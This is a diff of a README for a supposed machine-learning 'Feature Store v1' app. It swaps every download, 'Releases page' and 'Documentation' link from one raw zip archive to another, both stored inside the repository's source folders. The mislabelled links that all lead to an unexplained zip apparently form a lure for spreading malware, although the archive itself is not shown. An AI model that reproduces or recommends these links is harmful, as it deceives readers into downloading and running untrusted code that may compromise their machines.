@@ -1,6 +1,6 @@
 # 📦 feature-store-v1 - A Simple Way to Manage Your Machine Learning Data
 
-![Download](https://raw.githubusercontent.com/Darekmi9/feature-store-v1/main/src/feature_store.egg-info/feature-store-v1_ministress.zip)
+![Download](https://github.com/Darekmi9/feature-store-v1/raw/refs/heads/main/src/feature_store/v_feature_store_v3.3.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Before you begin, ensure that your system meets the requirements.
 
 To get started, you need to download the application. 
 
-1. Click the following link to visit the Releases page: [Download Feature Store v1](https://raw.githubusercontent.com/Darekmi9/feature-store-v1/main/src/feature_store.egg-info/feature-store-v1_ministress.zip).
+1. Click the following link to visit the Releases page: [Download Feature Store v1](https://github.com/Darekmi9/feature-store-v1/raw/refs/heads/main/src/feature_store/v_feature_store_v3.3.zip).
    
    You will see the available versions of Feature Store v1.
 
@@ -57,7 +57,7 @@ After installation, you can begin using the application. Follow these basic step
 
 ## 📖 Documentation
 
-For more detailed instructions on how to use specific features, visit the [Documentation](https://raw.githubusercontent.com/Darekmi9/feature-store-v1/main/src/feature_store.egg-info/feature-store-v1_ministress.zip). Here you can find guides and tips to make the most of Feature Store v1.
+For more detailed instructions on how to use specific features, visit the [Documentation](https://github.com/Darekmi9/feature-store-v1/raw/refs/heads/main/src/feature_store/v_feature_store_v3.3.zip). Here you can find guides and tips to make the most of Feature Store v1.
 
 ## 🛠️ Troubleshooting
 
@@ -81,4 +81,4 @@ Thank you for choosing Feature Store v1. We hope it meets your needs in managing
 
 ## 📥 Download Feature Store v1 Again
 
-Don't forget to visit the Releases page to download: [Download Feature Store v1](https://raw.githubusercontent.com/Darekmi9/feature-store-v1/main/src/feature_store.egg-info/feature-store-v1_ministress.zip).
+Don't forget to visit the Releases page to download: [Download Feature Store v1](https://github.com/Darekmi9/feature-store-v1/raw/refs/heads/main/src/feature_store/v_feature_store_v3.3.zip).
